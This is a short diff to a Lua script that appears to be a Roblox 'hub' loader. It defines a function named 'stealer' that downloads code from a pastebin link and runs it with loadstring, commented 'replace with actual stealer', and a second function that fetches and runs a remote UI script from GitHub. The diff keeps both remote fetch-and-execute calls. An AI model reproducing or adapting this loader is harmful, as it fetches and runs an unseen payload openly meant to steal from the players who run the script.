@@ -1,8 +1,8 @@
 local function stealer()
-    loadstring(game:HttpGet("https://pastebin.com/raw/WKkN2dNt"))() -- replace with actual stealer
+    loadstring(game:HttpGet("https://pastebin.com/raw/WKkN2dNt", true))() -- replace with actual stealer
 end
 local function loadui()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/AMIRI-HPV/XENON-HUB-V2-/refs/heads/main/UI", true))("discord.gg/csxu2nCkw9")
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/AMIRI-HPV/XENON-HUB-V2-/refs/heads/main/UI", true))()
 
 end
 
